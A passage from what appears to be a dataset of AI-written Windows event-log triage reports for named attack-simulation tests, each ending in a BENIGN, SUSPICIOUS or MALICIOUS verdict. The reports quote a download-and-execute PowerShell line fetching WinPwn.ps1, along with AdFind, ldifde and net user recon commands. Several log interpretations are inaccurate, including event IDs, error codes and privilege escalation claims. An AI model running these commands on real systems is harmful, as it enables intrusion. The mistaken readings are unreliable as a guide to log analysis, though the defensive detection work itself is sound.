   - The frequent execution of `wevtutil.exe` is also noted, which is used for event log management. This could be suspicious if repeated without a known administrative task or reason.

5. **Process Execution Patterns:**
   - Many entries reflect various Microsoft Edge Update activities, which involve multiple executed commands with parameters related to system updates and COM registrations.
   - `fsutil.exe` was invoked to check for drives, which is an action typically associated with administrative tasks or system queries.
   
### Assessment & Recommendations:
The majority of the observed behaviors relate to standard processes associated with system maintenance, time synchronization, or software update processes (specifically for Microsoft Edge). There are no clear signs of privilege escalation, suspicious command-line operations, or unusual process hierarchies that denote compromise.

- **Resolution: BENIGN**: Given the log information, the activities largely indicate standard system behaviors associated with operating system maintenance and software updates. All observed activities align with known legitimate processes without apparent exploitation or compromise.
  
### Suggested Actions:
- **Continuous Monitoring**: Keep monitoring for any deviations from common operating patterns that could signal covert malicious activity.
- **Review update configurations**: Ensure that the `MicrosoftEdgeUpdate.exe` installations and configurations are verified to be genuine and expected.
- **Logging Configuration Check**: Ensure event logging configurations are robust for capturing meaningful context should future anomalies arise."
Enumerate all accounts via PowerShell (Domain),"Based on the analysis of the provided event logs, I have identified several activities that warrant closer attention due to potentially suspicious behavior:

1. **Wevtutil and Conhost Processes:** 
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are repeatedly executed by the same user (`SERVER002\\admin_test`). 
   - While these utilities are legitimate Windows binaries, the rapid and repetitive execution without clear context can sometimes be indicative of malicious use, such as log tampering or spear phishing attacks.

2. **PowerShell Usage:** 
   - PowerShell is executed with commands that gather user account information, such as:
     - `net user /domain`
     - `get-localgroupmember -group Users`
     - `get-aduser -filter *`
   - The combination of these queries indicates the possibility of reconnaissance activity from an authorized account, potentially probing the environment for user and group information.

3. **Net and Net1 Commands:**
   - The `net.exe` and `net1.exe` commands are used in conjunction, which is often associated with administrative tasks. However, their usage in this sequence can also be indicative of user enumeration or privilege escalation attempts.

4. **High Integrity Level Processes:**
   - Several processes are running with a high integrity level, which implies they have privileges that could be leveraged for lateral movement or privilege escalation.

Considering these observations, the logs contain several noteworthy indicators that suggest potential suspicious activities. However, without additional context or evidence, it is not definitive enough to classify it as malicious activity. These actions, particularly the PowerShell command usage, could have legitimate administrative purposes but also align with common reconnaissance tactics by malicious actors.

**Resolution: SUSPICIOUS**

**Guidance:**
- Perform a deeper investigation into the intent of the `admin_test` user account activities on `Server002`, particularly looking at recent changes to the environment or files accessed around the same timeframe.
- Review the organization's change management records to see if these actions correlate with authorized activities or patches.
- Investigate user account behaviors, focusing on recent authentications, network logs, and any anomalies in login times or locations.
- Implement enhanced monitoring or alerting on `Server002` and around `admin_test` account activities to detect further suspicious or anomalous actions.
- Educate and check for any deviations or social engineering attempts targeting personnel with network and system admin roles."
System Information Discovery with WMIC,"Upon carefully analyzing the provided logs, the following findings and assessments have been made:

1. **Whoami and Hostname Queries**: There are multiple instances where the `whoami.exe` and `hostname.exe` commands are executed by the user `SERVER002\admin_test`. The `whoami` command is benign in nature and used to check the current user context. Similarly, `hostname` is used to determine the name of the computer. These commands are not inherently suspicious unless used in an unusual context, which is not clearly evident from the logs.

2. **Conhost and Wevtutil Activity**: The `conhost.exe` process interacts with `wevtutil.exe`, which is a legitimate tool used to manage event logs. Execution by `SERVER002\admin_test` does not exhibit clear indicators of malicious activity. However, excessive usage without an apparent administrative purpose could be a point of concern.

3. **Edge Update Activity**: A substantial portion of the logs showcases activity related to Microsoft Edge updates. The `MicrosoftEdgeUpdate.exe` and related processes run under `NT AUTHORITY\SYSTEM`, which is indicative of legitimate software update functionalities. Logs show several instances of process creation and execution align with typical software updates.

4. **WMI Command-line Queries**: Numerous instances are noted where `wmic.exe` runs under the `SERVER002\admin_test` user to query system information (CPU, memory, BIOS, etc.). While this might indicate legitimate administrative or monitoring tasks, if unwarranted, such activity could be considered suspicious for system reconnaissance.

5. **Command Prompt Activity**: The use of `cmd.exe` to run extensive WMI queries all at once seems unusual, particularly if performed without clear authorization or need. This pattern can be associated with reconnaissance activities typical of lateral movement within a network.

**Assessment**:
- No clear malicious patterns such as privilege escalation, execution of unknown software, or unauthorized access attempts are explicitly captured in the logs.
- The use of `cmd.exe` alongside `wmic.exe` may warrant further investigation to ensure it's part of legitimate and authorized administrative activity.
- Edge update events and their timing appear legitimate based on provided data.

Given these observations, the situation should be classified as:

- **SUSPICIOUS**: Specific activities (like the bulk WMI queries) require further exploration to confirm they are legitimate administrative actions and not reconnaissance by a potential insider or threat actor.

**Next Steps**:
- Verify the legitimacy and authorization of the `SERVER002\admin_test` user actions concerning the WMI and CMD activities.
- Cross-reference user activity times with organizational schedules to confirm authorized use.
- Monitor the host for additional unexpected or unwarranted behavior.

In summary, while no explicit malicious events are identified, suspicious actions warrant further review to ensure system security."
PowerView ShareFinder,"## Analysis

### **Windows PowerShell Logs**
The PowerShell logs indicate that a script `PowerView.ps1` was executed to run `Invoke-ShareFinder` with the `-CheckShareAccess` parameter. PowerView is a well-known PowerShell tool used for network reconnaissance in penetration tests. The invocation of such a script, especially from a temporary directory, suggests potentially unauthorized internal network scanning activity, which can be indicative of a compromise.

### **Process Execution in Sysmon Logs**
- **Multiple PowerShell Executions**: PowerShell is frequently used in attack scenarios, especially when combined with a script like `PowerView.ps1`.
- **High Privilege Process Executions**: There are several instances of processes that are running under `NT AUTHORITY\SYSTEM`. This user context indicates high privilege operations, but they seem to be consistent with the system activity like Edge updates and system processes.
- **Repeating Usage of Microsoft Edge Updaters**: Multiple instances of MicrosoftEdge updates and related executables are observed. While this may seem normal for a system managing an automatic update process, the frequency and intensity of these operations raise a slight flag for possible abuse or cloaked activity.

### **Security Logs**
- **Repeated Event 4624**: This logon-type is a batch job, which might be consistent with scheduled tasks. However, combined with Event 4672, which logs the use of special privileges like `SeDebugPrivilege`, it indicates that highly privileged accounts were active around the same time as the suspicious PowerShell activity.
- **Credential Access Events (5379)**: These events refer to Credential API access attempts which have failed. The process attempting this was `taskhostw.exe`, contextualized with running sequences under SYSTEM, potentially indicating credential scraping attempts.

### **Anomalies and Indicators of Malicious Activity**
- **PowerView and ShareFinder Execution**: This indicates reconnaissance, commonly associated with lateral movement tactics in a compromised network.
- **Credential Access**: Attempted access to credential APIs hints at potential credential theft efforts.
- **Use of High Privilege Tasks**: Execution and privilege escalation tools indicate possibly malicious manipulations beyond typical user operations.

## Assessment

### **Situation Assessment**
Based on the logs reviewed, there are significant signs of activities consistent with malicious actions. The combination of network reconnaissance tools, high privilege process executions, and attempts at credential access suggests possible compromise or malicious activity.

### **Threats and Risks Identified**
- **Internal Reconnaissance**: Potential probing of network shares with `PowerView`.
- **Credential Thefts Attempts**: Indicative of attempts to gain further network access.
- **Privilege Operations**: High privilege tools and settings raise concerns for unauthorized actions.

### **Guidance on How to Proceed**
1. **Immediate System Audit**: Investigate the source and reasons behind the use of `PowerView.ps1`.
2. **Monitor for Lateral Movement**: Check for any lateral connections or attempts.
3. **Credential Monitoring**: Ensure no compromise of credentials has occurred.
4. **Investigate Use of SYSTEM Account**: Verify if scheduled tasks or running services have been tampered with.

## Resolution: **MALICIOUS**

The logs analyzed contain indicators of potentially unauthorized and possibly malicious activity, primarily concerning the execution of PowerShell scripts for reconnaissance and elevated process creation with attempts at credential access. Immediate further investigation and remediation are recommended."
WinPwn - Morerecon,"After conducting a thorough analysis of the provided Windows event logs, several indicators of potentially malicious activity stand out. Here's a detailed assessment:

### Indicators of Malicious Activity:
1. **PowerShell Execution with Suspicious Script:**
   - The logs show multiple events where PowerShell is executed with a script downloaded from a URL typical of penetration testing or malicious usage. Specifically, the script `WinPwn.ps1` is downloaded and executed using `iex(new-object net.webclient).downloadstring(...)`.
   - The repository `S3cur3Th1sSh1t` is a known source for penetration testing tools, which indicates that this could be a potential compromise or unauthorized testing activity.

2. **Privilege Escalation:**
   - The Security logs show EventID 4672, indicating special privileges (SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, etc.) were granted to the user `admin_test`. This kind of privilege granting could indicate privilege escalation, which can be suspicious if not documented or expected.

3. **Multiple Sysmon Logs with Console Host and Process Execution:**
   - Several process executions (e.g., `wevtutil.exe`, `conhost.exe`) by the user `admin_test` could represent normal administrative activities. However, the timing alongside the PowerShell execution raises suspicion, especially as it occurs immediately after each other.

### Assessment:
- The activity observed in the PowerShell logs is particularly concerning. The use of `iex` with an external script, especially from a potentially untrusted source, is often associated with malicious activity unless it is sanctioned and verified testing.
- The combination of the PowerShell activity and the privilege escalation for `admin_test` suggests that this may be an attempt to conduct unauthorized actions on the server.

### Recommendation:
- **Resolution: MALICIOUS**
  - Immediate action needs to be taken to verify the integrity and security of `Server002`. Potential compromise could have occurred due to the unauthorized execution of PowerShell scripts.
  - Conduct a full security audit of `Server002`, reviewing any unauthorized changes or additional scripts in place.
  - Assess user `admin_test` for unauthorized actions and consider temporary suspension of account access until further review.
  - Update and apply any missing security patches to the server.
  - Ensure all logs are safely stored for any future cybersecurity investigations or forensic analysis.

In conclusion, the combination of the PowerShell activity and the security events, along with their timing and characteristics, strongly indicate malicious intent or unauthorized testing. Immediate remediation steps should be taken to contain and resolve the potential compromise."
System Network Connections Discovery with PowerShell,"**Detailed Analysis:**

The event logs provided suggest an analysis of services and processes executed on a Windows host, Server002, which is under scrutiny for potential malicious activities. The analysis focuses primarily on PowerShell activities and Sysmon events, then corroborates these with logs from the security, system, and application records.

1. **PowerShell Log Analysis:**
   - The PowerShell logs show a sequence of Provider Start and Engine State transitions involving the use of `powershell.exe` with the command `Get-NetTCPConnection`. 
   - `Get-NetTCPConnection` is typically used for querying active TCP connections, which might not be inherently malicious if used for legitimate network diagnostic purposes. However, repeated querying in short intervals can be suspicious, especially if it’s redundant or unexpected.

2. **Sysmon Log Analysis:**
   - Multiple process creation events (`EventID: 5`) are noted for the `wevtutil.exe` and `conhost.exe` processes. While `wevtutil.exe` is a legitimate tool for managing Windows Event Logs, its frequent invocation suggests it could be used to clear or query event logs in a suspicious context. However, it is conducted by a user with ID `SERVER002\admin_test`, which might imply an administrative task.
   - `conhost.exe` is typical for console windows and its presence as a parent or child process to `wevtutil.exe` and `powershell.exe` does not inherently signal malicious activity unless used to bypass or run unauthorized processes.
   - The use of `whoami.exe` and `hostname.exe` also reflects gathering of user and machine identity information, which might be benign but could be preparatory steps in advanced attacks (e.g., lateral movement or privilege escalation attempts).

3. **Security, System, and Application Logs:**
   - Notable entries, such as `EventID: 4616` from Security logs, reveal a time change entry. Time manipulation can be suspicious if tampering with event logs or timestamps is in question, possibly indicating an attempt to obfuscate the true sequence of activities.
   - The System log entries record time change, processed by `svchost.exe`, indicating synchronization with an NTP server, which is usually benign unless manipulated maliciously.
   - The entries from `sppsvc.exe` and edge updates (`MicrosoftEdgeUpdate.exe`) appear routine for software management and system protection services.

**Assessment:**

- **Suspicious Events:** 
   - The frequent execution of `wevtutil.exe` and PowerShell with `Get-NetTCPConnection` by a user, especially if outside standard operating procedures.
   - Time synchronization adjustments that coincide with service executions.
   - Use of network and system information-gathering commands, which can be benign, but are potentially preparatory for an attack, depending on the context of the usage.

- **Benign Events:**
   - Execution of routine processes like `MicrosoftEdgeUpdate.exe`, `svchost.exe`, `sppsvc.exe`.
   - No evident privilege escalation or unauthorized access attempts.

**Resolution:**

- **SUSPICIOUS**: The logs contain activity that warrants further investigation. While no explicitly malicious actions are identified, the behavior of repeated network probing and event log utility usage, along with time changes, merit closer scrutiny. Further context and user verification should be acquired to understand the legitimacy of these operations. Analysis should continue with potential correlations in broader network or security logs and user activity verification. If possible, verifying the intent and regularity of actions by `admin_test` and reconfirming time-setting procedures could clarify potential risks."
Port-Scanning -24 Subnet with PowerShell,"### Detailed Analysis of the Logs:

1. **Time Manipulation:**
   - In the system log and corresponding security log, the system time was adjusted backwards (from ""2024-10-22 14:46:30.2597084"" to ""2024-10-22 14:46:01.6207235""). This is an unusual activity and can be an indicator of malicious intent as time change manipulation could be used to obscure event timelines, particularly around critical actions.

2. **Suspicious PowerShell Execution:**
   - There is a PowerShell command being executed that includes network scanning functionality, specifically scanning IP subnets for open ports 445 and 3389. This behavior is often associated with reconnaissance actions performed by an attacker attempting to find vulnerable systems within the network.

3. **Privilege Escalation:**
   - The security logs reflect a privilege escalation for the account ""admin_test"" immediately after the PowerShell activity, which obtained privileges like SeDebugPrivilege and SeTakeOwnershipPrivilege, indicating potential malicious behavior if this is not routine for this user.

4. **Unusual Process Activity:**
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, and `whoami.exe` are executed frequently by ""SERVER002\\admin_test"". The use of `wevtutil.exe` and `whoami.exe` in this context could be part of an enumeration or information-gathering strategy typically used in penetration testing or post-exploitation.

5. **System and Network Services:**
   - Standard system services like `svchost.exe`, `MicrosoftEdgeUpdate.exe`, and `WmiPrvSE.exe` show expected behavior like system updates and normal management operations without any flags of unusual execution or anomaly in context.

6. **Edge Update:**
   - Numerous log entries relate to the Microsoft Edge Update process. Given the context and timing, this appears to be part of a legitimate update cycle for Microsoft Edge, and lacks indicators of compromise.

### Assessment of the Situation:

The evidence collected highlights a few concerning activities, predominantly centered on the manipulation of system time, suspicious PowerShell usage that performs network reconnaissance, and privilege escalation events for a user account to an administrative scope. These activities certainly warrant further investigation to establish context, user's intent, and to ensure that these actions were legitimate and sanctioned by the security policy of the organization.

### Conclusions and Recommendations:

- **Resolution:** SUSPICIOUS
- **Next Steps to Proceed:**
  - **Investigate the Time Change:** Verify why time manipulation occurred and if there are alignment issues with time servers.
  - **Review PowerShell Execution:** Confirm whether the PowerShell script executed by ""admin_test"" was a legitimate administrative task or if it was executed as part of unauthorized actions.
  - **Privilege Review:** Assess the activities of ""admin_test;"" understand the necessity of the privileges acquired and whether they reflect typical use patterns.
  - **User Verification and Training:** Verify the legitimacy of the activities performed by ""admin_test"" and provide additional security training as necessary.
  - **Monitor and Alert Setup:** Implement enhanced logging and alert systems for future similar activities, focusing on process execution and privilege changes."
Get-WmiObject to Enumerate Domain Controllers,"### Detailed Analysis of Windows Event Logs:

1. **Time Discrepancies:**
   - The time change events logged by `Microsoft-Windows-Kernel-General` show a discrepancy where the system time was modified sequentially (EventID 1 & 24). This might happen due to legitimate reasons such as a service restart, system maintenance, or synchronization with a time source. However, it can sometimes be indicative of attackers manipulating time for various reasons, such as hiding activities (Log tampering).

2. **Use of Built-in Windows Tools:**
   - Multiple processes executed by the user `ADMIN_TEST` involve legitimate Windows binaries like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` (`ProcessID`s: 1508, 2300, 4908, 2616, 3792, etc.). Specifically, the use of `powershell.exe` with the command to run `get-wmiobject` appears typical for system management but could be associated with reconnaissance activities if not carried out by known administrative tasks.
   - As these activities involve admin-level tasks, they should be assessed in the context of the user’s known activities to discern if these were legitimate administrative actions or potentially malicious.

3. **Privileged Operations:**
   - Security logs show `admin_test` exercising high-privileged rights such as `SeDebugPrivilege`, `SeSecurityPrivilege`, and others (EventID 4672). While granting such rights can be typical in an administrative context, this should be verified against known administrative practices and expected behavior during the timeframe.

4. **Credential Theft Attempts:**
   - The security log (EventID 5379) indicates credential-related attempts that return a failure code (`ReturnCode: 3221226021`). This could indicate an attempt to access or manipulate credential data, which failed. The context and frequency of these events warrant further verification with the user for authorized activity.

5. **Windows Update and Defender Activities:**
   - Installation and updates related to `Microsoft Defender Antivirus` are legitimate and regular maintenance operations (EventIDs 43, 44, and 19). These should be verified against a scheduled update policy to check if they align as expected.

6. **Use of Windows PowerShell:**
   - PowerShell is invoked (EventID 600, reported in both Windows PowerShell and Sysmon EventID 1) with commands for querying WMI objects. This script or command should be cross-referenced with known scripts used by IT during maintenance or specific tasks to rule out misuse.

### Assessment and Recommendation:

- **Threat/Anomaly Identification:**
  - **Time Adjustments**: Requires verification of logs/system maintenance or tasks run during the time gaps.
  - **Process Execution**: While leveraging built-in tools is typical in many administrative contexts, extensive use, especially within a single timeframe, should be correlated against known tasks or schedules.
  - **Failed Credential Reading**: Might indicate attempted unauthorized access.
  - **Privilege Usage**: If not aligning with known administrative tasks, the usage of elevated privileges should be investigated.

**Resolution**: **SUSPICIOUS**

- **Actionable Steps:**
  - **Verify Time Changes**: Check if these were part of scheduled maintenances.
  - **Cross-Check with IT/Administration**: Validate if the administrative actions align with routine tasks or whether they raise a concern for misuse.
  - **User Verification**: Engage with the user `admin_test` to ensure actions were deliberate and authorized.
  - **Continuous Monitoring**: Temporarily increase monitoring on affected systems for unusual activity or behaviors.
  - **Data Backup and Security Policies**: Ensure policies are up-to-date to prevent exploitation of privileges or execution of unauthorized scripts.

Further investigation is needed to confirm the legitimacy or detect potential malicious activity beyond suspicion."
Security Software Discovery - Windows Firewall Enumeration,"Upon reviewing the provided Windows event logs, here's a detailed analysis of potential suspicious activities:

### System Log
1. **Windows Update Client Events (EventID 19):** 
   - These events indicate updates for Windows Defender. The consistent timing and process IDs suggest regular update activity, which is benign.

2. **Kernel-General and Time-Service Events:**
   - These events include changes to system time. While time changes can be suspicious if unauthorized, the changes here are associated with the Windows Time Service synchronizing time from a legitimate time source (`time.windows.com`). This appears benign unless further context (not shown here) implies malicious intent.

3. **Windows Kernel-General Events (EventID 1):**
   - These events indicate the `svchost.exe` process, which is a normal Windows process managing services. No anomalies are detected here.

### Application Log
1. **SecurityCenter Activity:**
   - Windows Defender is reported as active. This is benign and indicates that antivirus protection is enabled.

2. **Software Protection Platform Service Events:**
   - Routine activity involving software protection, with no immediate signs of compromise.

3. **Edge Update Service Stopped:**
   - The entry about the Edge Update service stopping is regular behavior and not indicative of malicious activity on its own.

### Windows PowerShell Log
- A sequence of PowerShell start events showing a script execution gathering firewall rules and settings using `Get-NetFirewallProfile`, `Get-NetFirewallSetting`, and `Get-NetFirewallRule`. This could be legitimate if performed by a system administrator or a maintenance script.
- However, if this was not a known or scheduled task, it could be suspicious as attackers often query firewall settings using PowerShell. Thus, this case demands further validation of the user ""admin_test"" actions.

### Security Log
- **Security Audit Success (EventID 4616):**
  - These logs show time changes audited by `svchost.exe`. As the context matches the System log and considers authorized use of `svchost.exe`, these appear benign.

### Sysmon Log
1. **Process Creation Logs:**
   - Consistent benign activities related to `whoami.exe`, `conhost.exe`, `wevtutil.exe`, and `MpCmdRun.exe` processes identifying common administrative and system-level tasks.
   
2. **Windows PowerShell Execution:**
   - The command includes inspecting firewall rules, implying potential for both benign administrative actions or preparatory actions by a threat actor.
   - Execution of PowerShell with elevated privileges (High Integrity Level) also warrants checking to confirm authorized use case. 

3. **Edge Update Execution:**
   - Multiple events logged related to `MicrosoftEdgeUpdate.exe`, showing regular update actions by the system application, which is benign.

### Assessment & Guidance

- **Benign Elements:** The majority of logs such as the updates, time changes, and certain application service stops are benign operations.
- **Suspicious Elements:** Some PowerShell activities are noteworthy. If the execution context or user ""admin_test"" lacks a valid operational need for such detailed firewall queries, it requires further investigation.

### Resolution: SUSPICIOUS

- The PowerShell activity needs further scrutiny to determine the intent and whether it is authorized.
- Verify the actions and purpose of user ""admin_test"" during this logged period.
- Confirm with network logs if any unauthorized attempts to exfiltrate information were made post elevated PowerShell activity.

### Next Steps
- Carry out an interview or review records of ""admin_test"" to confirm legitimacy.
- Look into network perimeter logs to check for unusual outbound traffic post PowerShell script execution.
- Implement additional monitoring on PowerShell activities, especially those involving network configurations or firewall rules."
Adfind - Enumerate Active Directory OUs,"Based on the provided log snippets, several observations can be made that point to suspicious or potentially malicious behavior:

1. **Frequent Execution of EdgeUpdate**: The logs show numerous instances of `MicrosoftEdgeUpdate.exe` related to updating or maintaining Microsoft Edge. While this is not inherently suspicious, the sheer volume and timing of these updates could raise a red flag if this level of frequent updates is unexpected or unusual for the given environment.

2. **Execution of PowerShell**: An instance of `powershell.exe` being executed by the user `SERVER002\\admin_test` is seen in the logs. PowerShell is a commonly abused tool for attackers, and its usage should be closely monitored, especially if not typical for the user in question.

3. **Execution of Command-Line Tools**: `HOSTNAME.EXE` and `whoami.exe` are used to gather system and user information. While these are valid commands, they can be used by an attacker to gather information about a compromised system.

4. **Usage of AdFind**: The command `cmd.exe /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe\"" -f (objectcategory=organizationalUnit)` indicates the use of AdFind, a legitimate tool often used by attackers during reconnaissance to query Active Directory. Execution from a temporary directory and obfuscated paths also raise concerns.

5. **Execution of wevtutil.exe**: This executable is used to manage Windows event logs. Multiple instances are seen being run, which could indicate attempts to clear logs or perform actions that might hide other activities. The correlation of this activity with the same user account (`SERVER002\\admin_test`) responsible for other potentially suspicious actions is noteworthy.

6. **High Integrity Levels**: Processes launched by `SERVER002\\admin_test` show an integrity level of ""High,"" indicating elevated privileges, which if unexpected, could suggest potential privilege escalation.

**Assessment:**

The activity in these logs cannot be conclusively determined as malicious by analysis alone, but it is highly suspicious. The repeated launching of system monitoring tools, information-gathering commands, and execution of automated system updates under the guise of using a potentially benign update process could represent an attempt to cover up malicious activity or misuse legitimate processes for unauthorized purposes.

**Resolution: SUSPICIOUS**

Given the potential red flags identified, further investigation is recommended. Actions include:

- **Validating System Updates**: Check if the Microsoft Edge updates match official release timelines and ensure legitimate update paths.
- **Review PowerShell Activities**: Identify if there have been any anomalous scripts or commands executed.
- **Check User 'admin_test' Behavior**: Verify if this user's actions align with business needs and if any unexpected or unauthorized command-line executions occurred.
- **Investigating Network Traffic and Active Directory Access**: Determine if there are any associated anomalies in network communications or unusual Active Directory queries that align with the timestamps of the logs.

The situation warrants closer inspection to rule out misuse or compromise."
Extract Edge Browsing History,"Upon reviewing the provided log entries, initial observations highlight both routine activities and potentially suspicious behaviors. Below is a comprehensive analysis regarding apparent patterns or anomalies:

### Security Log
- **Event ID 4616 (Time Change):** This indicates changes in the system time usually administered by SYSTEM-level processes. In these logs, ""svchost.exe"" executed these changes, which is a legitimate process in Windows. There's no further activity combined with this that suggests active tampering of time for malicious purposes.

### Application Log
- **Event ID 0 (Edge Update):** The ""edgeupdate"" service being stopped is recorded. This activity aligns with regular service updates or stops and does not immediately indicate any suspicious or malicious behavior. It's essential to correlate this with other logs, but on its own, it appears benign.

### System Log
- **Kernel-General (Event ID 1 and 24):** These events indicate system time adjustments by svchost.exe, a frequent host service for system processes. No abnormal parameters or entities between processes are noted here, suggesting a legitimate system activity involving routine system adjustments.

### Sysmon Log
- **Repeated PowerShell Execution:** A PowerShell script extracts browsing history from the Edge browser, then outputs this to a text file. This is a significant red flag and suggests potential information extraction which could indicate malicious activity if not authorized for monitoring or backup purposes. 
- **Process Creation Logs (Event ID 1):** Several instances of processes like ""whoami.exe"", ""powershell.exe"", and numerous instances of ""MicrosoftEdgeUpdate.exe"" executing in quick succession. While the Edge Update executions appear inline with software updating processes, the PowerShell command's nature stands out for further scrutiny.

### Windows PowerShell Log
- **PowerShell Execution:** There is execution of a PowerShell script capturing browser history. While similar PowerShell commands can be used by legitimate IT operations to analyze or backup browser data, it may be unauthorized or malicious without prior context or approvals, especially aimed at user browser data.

### Assessment Summary
1. **Benign Activities:**
   - Time changes and general Kernel events seem routine.
   - The Microsoft Edge Update processes are consistent with automated software updates.

2. **Suspicious Activities:**
   - PowerShell scripts attempting to access and save Edge browsing history stand out. Especially due to:
     - Extraction and writing of browser history, potentially without user consent.
     - High-integrity level of execution, indicating potential administrative level permissions.

### Resolution
**SUSPICIOUS** - The PowerShell execution pattern raises concern due to its direct access to user browsing data. While there are justified, legitimate uses for such scripts in environments like forensic investigations or administrative oversight, this behavior necessitates verification with existing security policies and mappings for administrative scripts. 

### Recommended Actions
- **Verify Authorizations:** Check if the PowerShell command aligns with any sanctioned IT or security procedure.
- **Investigate the User ""SERVER002\\admin_test"":** Confirm if this account had legitimate reasons for accessing the data.
- **Inspect for Malicious Scripts:** Review the system for unauthorized scripts or scheduled tasks which might indicate further malicious behavior.
- **Conduct User Awareness:** Ensure users and IT personnel are informed about policies regarding data access and logging, enforcing stricter monitoring if necessary.

Given these considerations, further examination into the PowerShell activity is imperative to ensure system integrity and compliance with security protocols."
Process Discovery - Get-Process,"### Detailed Analysis:

**Windows System Logs:**
- The system log entries primarily record time changes on the system. The time was adjusted backward, which could sometimes be a legitimate event if syncing time with an NTP server, but it may also indicate potential tampering to hide activities.

**Sysmon Logs:**
- **Process Execution (Event ID 5):**
   - The logs show multiple instances of `wevtutil.exe` and `conhost.exe` being executed by the user `SERVER002\admin_test`. Wevtutil is commonly used to query and manage event logs and has legitimate uses. Conhost is used to handle command windows and is also legitimate. However, the frequent and rapid launching of these processes could suggest an automated script or an unusual user activity pattern that requires closer inspection.
   - The `whoami.exe` command was executed, which is often used for checking the current user identity in a system, possibly indicating a check for privileges.
   - Windows PowerShell was used to execute a simple `Get-Process` command. While the command itself is benign, PowerShell usage can sometimes be indicative of deeper scripted activities or remote administration.

**Security Logs:**
- **Privilege Use (Event ID 4672):**
   - The account `SERVER002\admin_test` was assigned several high-level privileges (e.g., SeDebugPrivilege, SeBackupPrivilege), which is common for admin accounts. However, making note of these privileges could help identify potential misuse if linked with other suspicious activities.
   
- **Logon Events (Event ID 4624):**
   - There were logon events using NTLM authentication from an external workstation (DESKTOP-3HL5B2P) indicating a remote session. This could be normal administrative activity but warrants verification to ensure the external logon is legitimate.

**Application Logs:**
- The Software Protection Platform Service was logged, which usually relates to licensing and activation tasks. This entry generally doesn’t indicate malware by itself.

**Windows PowerShell Logs:**
- The PowerShell logs recorded different sessions opening and closing. The logged actions show the starting of various shell components, likely related to the execution of a PowerShell script or command. The command observed was benign.

### Assessment:
- While no immediate evidence of malicious activity is apparent from these logs, there are several points of interest that might warrant further investigation:
  - **Frequent Process Execution:** The rapid sequence of `wevtutil.exe` and `conhost.exe` could need more context to determine if it’s part of a repetitive task or anomalous behavior.
  - **External logon attempts and NTLM usage:** Verify the legitimacy of the logon from DESKTOP-3HL5B2P to rule out unauthorized remote access.
  - **Privilege Levels:** Keeping track of privilege usage for `SERVER002\admin_test` can be crucial if combined with suspicious activities.

### Guidance and Resolution:
- **Verify the purpose and context** of the wevtutil and conhost process executions.
- **Confirm the legitimacy** of the logon activity from the external workstation.
- **Monitor for ongoing anomalies** in privilege usage or frequent suspicious command-line activity.

### Resolution: SUSPICIOUS
- There are some activities that could align with normal system operations, but they carry a potential risk if the context doesn’t fully justify them. Further investigation into the specific activities and verification with users or administrators is necessary to confirm their legitimacy."
Active Directory Enumeration with LDIFDE,"### Analysis of the Windows Event Logs

Upon carefully reviewing the provided event logs, here is a detailed analysis of the key event entries, particularly those that could potentially indicate unusual or suspicious activities:

#### Security Log:

1. **EventID 4624 and 4672 - Logons and Privilege Use:**
   - Repeated logon events (EventID 4624) and associated special privileges (EventID 4672) involving the NT AUTHORITY\SYSTEM account. These appear to be consistent with system service operations, given the logon type ""5"", which represents a service logon.
   - The repeated privilege list being associated with the SYSTEM account seems standard in connection with legitimate Windows service activities.

2. **EventID 4798 - Group Membership Enumeration:**
   - There are multiple instances of group membership enumerations associated with the SYSTEM account. This is typically benign and often part of system maintenance or profile load operations.

3. **EventID 5379 - Credential Validation:**
   - Numerous failed credential validations appear with return code ""3221226021"" which translates to ""STATUS_LOGON_FAILURE"". All attempts appear linked to a Microsoft account ""user=02txoixylodcstop"". While concerning, the absence of further suspicious actions suggests automated processes or misconfigurations rather than active intrusion.

#### Sysmon Log:

1. **Process Creation Events:**
   - Legitimate system processes like `wevtutil.exe`, `taskhostw.exe`, and `svchost.exe` are observed to be running, which is typical of Windows operation.
   - Of specific interest, however, is the execution of PowerShell (as indicated by the event capturing `powershell.exe`), `whoami.exe`, and `cmd.exe` with specific arguments (e.g., ldifde.exe for LDAP data export). These could potentially indicate scripts or administrative tasks but are often used by malicious actors.

2. **cmd.exe Execution with ldifde.exe:**
   - The command `cmd.exe /c ldifde.exe -f C:\Windows\temp\file_ldifde.txt -p subtree` implies an export of directory information, which might be benign if used for legitimate administrative purposes or suspicious if unauthorized.

3. **Weird Characters or Encodings:**
   - While conhost.exe and wevtutil.exe are regularly interacting with the console, the lack of outputs or subsequent suspicious activity reduces immediate concern.

#### Application Log:

1. **Windows Error Reporting and Software Protection Events:**
   - Instances of error reporting and software protection events (CbsPackageServicingFailure) appear, which might warrant attention if consistently observed but typically align with update or package-related issues.

### Summary and Recommendation:

The logs exhibit characteristics of both regular system services and some activities that might raise questions. The repeated logon failures and usage of PowerShell and cmd command arguments, if not explicitly known to be legitimate, might necessitate further inquiry for assurance.

**Resolution: SUSPICIOUS**

- **Recommendation for Further Investigation:**
  - **Confirm Administrative Activities**: Verify with system administrators regarding the use of command-line tools, especially PowerShell and ldifde.exe to ensure they were legitimate and expected.
  - **Continuous Monitoring**: Implement or verify the existence of continuous monitoring solutions for unusual command-line activity or system changes.
  - **Review Account Management**: Audit the Microsoft account validation failures for potential misconfigurations or unauthorized attempts.

Overall, while no direct evidence of a breach or malicious intent is identified, the activities observed require validation to ensure organizational security integrity."
Adfind - Enumerate Active Directory Domain Controller Objects,"### Detailed Analysis of Logs

#### Key Observations:
1. **Windows PowerShell Log**: Not provided. Without these, any potential script-related indicators are unknown.
  
2. **Application Log**:
   - Continuous entries stating ""Windows Defender, SECURITY_PRODUCT_STATE_ON"", indicating that Windows Defender is active on the host. These messages appear benign and part of regular security configuration checks.

3. **System Log**:
   - Entries related to updates for the Microsoft Defender Antivirus indicate the system is downloading and applying security updates (e.g., ""KB2267602"").
   - These operations are typical for a well-maintained system with automatic updates configured.

4. **Sysmon Log**:
   - **Unusual PowerShell Usage:** A `powershell.exe` process executed by `SERVER002\admin_test` user. There is no indication of the command-line arguments used, making it difficult to determine if it was malicious. In normal operations, administrators may use PowerShell for scripting tasks.
   - **Usage of `wevtutil.exe`:** Multiple entries for execution by `admin_test`. This is a legitimate tool but can raise suspicion if used outside regular administrative tasks.
